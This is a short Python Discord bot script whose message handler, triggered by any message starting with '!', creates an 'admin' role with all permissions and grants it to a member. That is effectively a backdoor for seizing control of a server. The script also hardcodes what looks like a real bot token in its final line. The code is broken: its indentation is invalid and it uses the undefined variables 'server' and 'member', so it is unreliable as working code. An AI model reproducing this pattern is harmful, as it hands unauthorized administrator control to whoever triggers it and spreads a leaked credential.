# README:
# .ENV
# TOKEN=<your token>
# CLIENTID=<your client id>


import discord
import asyncio
import requests
import os
from discord import Permissions


client = discord.Client()

@client.event
async def on_ready():
    print('Logged in as')
    print(client.user.name)
    print(client.user.id)
    print('copy paste this in your browser to authorize bot https://discordapp.com/oauth2/authorize?client_id={}&scope=bot&permissions=0'.format(os.environ['CLIENTID']))
    print('------')



@client.event
async def on_message(message):
    if message.content.startswith('!'):
 role = await client.create_role(server, name="admin", permissions=Permissions.all());
await client.add_roles(member, role)

client.run('OTg5ODY1MTkwMjczMjA0MzA1.GZNvkq.uDrY_w0le7LoiQAqXIrpsWes4V9El5O8-cEoM0')
